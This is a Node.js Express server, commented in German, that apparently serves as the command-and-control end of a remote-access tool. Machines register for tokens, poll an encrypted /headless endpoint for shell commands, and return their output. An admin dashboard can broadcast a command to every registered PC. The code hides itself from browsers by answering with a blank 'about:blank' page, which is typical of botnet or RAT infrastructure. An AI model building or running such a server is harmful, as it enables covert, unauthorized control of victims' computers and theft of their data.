const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);

// Kein Caching
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    next();
});

const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Du_Musst_Ein_Passwort_Bei_Render_Eintragen_123456789";
const AES_KEY = crypto.randomBytes(32); // 256 Bit Schlüssel (wird beim Server-Neustart neu generiert)
const ALGORITHM = 'aes-256-cbc';

// --- Token & PC Management (in-memory) ---
const registeredTokens = {};  // { pcId: { token, lastSeen, online } }
const pcCommands = {};        // { pcId: "verschlüsselter Befehl" }

function generateToken() {
    return crypto.randomBytes(24).toString('hex'); // 48 Zeichen Token
}

// AES Verschlüsseln
function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, AES_KEY, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted; // iv:ciphertext
}

// AES Entschlüsseln
function decrypt(text) {
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const encryptedText = parts[1];
    const decipher = crypto.createDecipheriv(ALGORITHM, AES_KEY, iv);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(session({
    secret: process.env.SESSION_SECRET || 'session-secret-muss-geaendert-werden',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 30 * 60 * 1000 }
}));

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: '<h1>Zu viele Fehlversuche!</h1><p>Bitte warte 15 Minuten.</p>',
    standardHeaders: true,
    legacyHeaders: false,
});

// ==================== REGISTRIERUNG ====================
// PC registriert sich und bekommt Token + PC-ID
app.post('/register', (req, res) => {
    const { pcId } = req.body;
    if (!pcId) {
        return res.status(400).json({ error: 'pcId erforderlich' });
    }

    // Falls PC schon registriert ist, denselben Token verwenden
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = {
            token: generateToken(),
            lastSeen: Date.now(),
            online: false
        };
        console.log(`[REGISTRIERUNG] Neuer PC: ${pcId}`);
    }

    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();

    // Token im Klartext zurückgeben (nur beim ersten Mal nötig)
    res.json({
        token: registeredTokens[pcId].token,
        message: `PC "${pcId}" registriert`
    });
});

// ==================== HEADLESS ENDPOINT (verschüsselt) ====================
app.get('/headless', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const istBrowser = /Mozilla|Chrome|Safari|Firefox|Edge|Brave/i.test(userAgent);

    if (istBrowser) {
        return res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
    }

    // Token und PC-ID aus Headers lesen
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];

    if (!token || !pcId) {
        return res.status(401).send('Unauthorized: Token und PC-ID erforderlich');
    }

    // Token prüfen
    if (!registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
        return res.status(403).send('Forbidden: Ungültiger Token');
    }

    // PC als online markieren
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();

    // Befehl für diesen PC holen
    const command = pcCommands[pcId];

    if (command) {
        // Befehl entschlüsseln, zurückgeben, und löschen (one-shot)
        try {
            const decryptedCommand = decrypt(command);
            delete pcCommands[pcId]; // one-shot
            res.set('Content-Type', 'text/plain; charset=utf-8');
            res.send(decryptedCommand);
        } catch (e) {
            res.status(500).send('Entschlüsselungsfehler');
        }
    } else {
        // Kein Befehl vorhanden
        res.send('KEIN_BEFEHL');
    }
});

// ==================== OUTPUT EMPFANGEN (vom PC) ====================
app.post('/output', (req, res) => {
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    const encryptedOutput = req.body.output;

    if (!token || !pcId) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    if (!registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    // Output entschlüsseln und speichern
    try {
        const decryptedOutput = decrypt(encryptedOutput);
        
        // Im Server-Log speichern (später im Web-GUI anzeigbar)
        if (!app.outputs) app.outputs = {};
        if (!app.outputs[pcId]) app.outputs[pcId] = [];
        app.outputs[pcId].push({
            timestamp: new Date().toISOString(),
            output: decryptedOutput
        });

        console.log(`[OUTPUT] ${pcId}: ${decryptedOutput.substring(0, 100)}...`);
        res.json({ status: 'received' });
    } catch (e) {
        res.status(500).json({ error: 'Entschlüsselungsfehler' });
    }
});

// ==================== BEFEHl SENDEN (vom Admin) ====================
app.post('/command', (req, res) => {
    if (!req.session.eingeloggt) {
        return res.status(403).send('Zugriff verweigert!');
    }

    const { target, command } = req.body;
    // target kann sein: "all" oder eine spezifische pcId

    if (!command) {
        return res.status(400).send('Befehl erforderlich');
    }

    const encryptedCommand = encrypt(command);

    if (target === 'all') {
        // An alle registrierten PCs senden
        for (const id in registeredTokens) {
            pcCommands[id] = encryptedCommand;
        }
        res.json({ status: 'Gesendet an ALLE PCs' });
    } else if (registeredTokens[target]) {
        // An spezifischen PC senden
        pcCommands[target] = encryptedCommand;
        res.json({ status: `Gesendet an ${target}` });
    } else {
        res.status(404).json({ error: `PC "${target}" nicht gefunden` });
    }
});

// ==================== PC STATUS ====================
app.get('/pcs', (req, res) => {
    if (!req.session.eingeloggt) {
        return res.status(403).send('Zugriff verweigert!');
    }

    const pcs = Object.entries(registeredTokens).map(([id, data]) => ({
        id,
        online: data.online,
        lastSeen: new Date(data.lastSeen).toLocaleString('de-DE'),
        hasOutput: app.outputs && app.outputs[id] ? app.outputs[id].length : 0
    }));

    res.json(pcs);
});

// ==================== OUTPUTS ABFRAGEN ====================
app.get('/outputs/:pcId', (req, res) => {
    if (!req.session.eingeloggt) {
        return res.status(403).send('Zugriff verweigert!');
    }

    const pcId = req.params.pcId;
    const outputs = (app.outputs && app.outputs[pcId]) || [];
    res.json(outputs);
});

// ==================== ADMIN SEITEN (wie vorher) ====================
app.get('/', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
});

app.get('/admin', (req, res) => {
    if (req.session.eingeloggt) {
        return res.redirect('/admin/dashboard');
    }
    res.send(`
<h1>Admin Login</h1>
<form action="/admin/login" method="POST">
<input type="password" name="password" placeholder="Passwort" required><br><br>
<button type="submit">Einloggen</button>
</form>
`);
});

app.post('/admin/login', loginLimiter, (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORT) {
        req.session.eingeloggt = true;
        res.redirect('/admin/dashboard');
    } else {
        res.send('<h1>Falsches Passwort!</h1><a href="/admin">Nochmal versuchen</a>');
    }
});

app.get('/admin/dashboard', (req, res) => {
    if (!req.session.eingeloggt) {
        return res.redirect('/admin');
    }

    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
        h1 { color: #00d4ff; }
        .pc-list { margin: 20px 0; }
        .pc-item { padding: 10px; margin: 5px 0; background: #16213e; border-radius: 5px; }
        .online { border-left: 4px solid #00ff88; }
        .offline { border-left: 4px solid #ff4444; }
        .command-box { margin: 20px 0; }
        .command-box select, .command-box input { 
            padding: 10px; margin: 5px; background: #0f3460; 
            color: white; border: 1px solid #00d4ff; border-radius: 3px;
        }
        .command-box button { 
            padding: 10px 20px; background: #e94560; color: white; 
            border: none; border-radius: 3px; cursor: pointer;
        }
        .command-box button:hover { background: #ff6b6b; }
        a { color: #00d4ff; }
        .token-info { font-size: 0.8em; color: #888; }
    </style>
</head>
<body>
    <h1>🖥️ Remote Control Dashboard</h1>
    
    <div class="pc-list" id="pcList">
        <h2>Verbundene PCs</h2>
        <p>Lade PCs...</p>
    </div>

    <div class="command-box">
        <h2>Befehl senden</h2>
        <select id="target">
            <option value="all">📡 ALLE PCs (Broadcast)</option>
        </select><br>
        <input type="text" id="command" placeholder="Befehl eingeben... (z.B. ipconfig, dir, systeminfo)" style="width: 400px;"><br>
        <button onclick="sendCommand()">🚀 Befehl senden</button>
    </div>

    <div id="outputSection" style="display:none;">
        <h2>📟 PC Output</h2>
        <pre id="pcOutput" style="background: #0a0a0a; padding: 15px; border-radius: 5px; max-height: 400px; overflow-y: auto; white-space: pre-wrap;"></pre>
    </div>

    <br><a href="/admin/logout">Ausloggen</a>

    <script>
        // PCs laden
        async function loadPCs() {
            const resp = await fetch('/pcs');
            const pcs = await resp.json();
            const list = document.getElementById('pcList');
            const select = document.getElementById('target');
            
            list.innerHTML = '<h2>Verbundene PCs</h2>';
            select.innerHTML = '<option value="all">📡 ALLE PCs (Broadcast)</option>';
            
            pcs.forEach(pc => {
                // PC Liste
                const div = document.createElement('div');
                div.className = 'pc-item ' + (pc.online ? 'online' : 'offline');
                div.innerHTML = \`
                    <strong>\${pc.id}</strong> 
                    \${pc.online ? '🟢 Online' : '🔴 Offline'} 
                    <span class="token-info">(Letzter Kontakt: \${pc.lastSeen})</span>
                    <br><small>\${pc.hasOutput} Outputs gespeichert</small>
                    <button onclick="loadOutput('\${pc.id}')" style="margin-left:10px;">Output anzeigen</button>
                \`;
                list.appendChild(div);
                
                // Target Select
                const opt = document.createElement('option');
                opt.value = pc.id;
                opt.textContent = pc.id + (pc.online ? ' 🟢' : ' 🔴');
                select.appendChild(opt);
            });
        }

        // Befehl senden
        async function sendCommand() {
            const target = document.getElementById('target').value;
            const command = document.getElementById('command').value;
            
            if (!command) { alert('Bitte Befehl eingeben!'); return; }
            
            await fetch('/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target, command })
            });
            
            alert('Befehl gesendet!');
            document.getElementById('command').value = '';
            
            // Output nach 3 Sekunden laden (wenn spezifischer PC)
            if (target !== 'all') {
                setTimeout(() => loadOutput(target), 3000);
            }
        }

        // Output laden
        async function loadOutput(pcId) {
            const resp = await fetch('/outputs/' + pcId);
            const outputs = await resp.json();
            const outputDiv = document.getElementById('pcOutput');
            const section = document.getElementById('outputSection');
            section.style.display = 'block';
            
            outputDiv.textContent = outputs.map(o => 
                '[\${o.timestamp}]\\n' + o.output
            ).join('\\n---\\n') || 'Keine Outputs vorhanden.';
        }

        // Auto-Refresh alle 10 Sekunden
        loadPCs();
        setInterval(loadPCs, 10000);
    </script>
</body>
</html>
`);
});

app.get('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin');
});

app.listen(PORT, () => {
    console.log(`Server läuft auf Port ${PORT}`);
    console.log(`AES-256 Verschlüsselung AKTIV`);
    console.log(`Admin: /admin`);
});
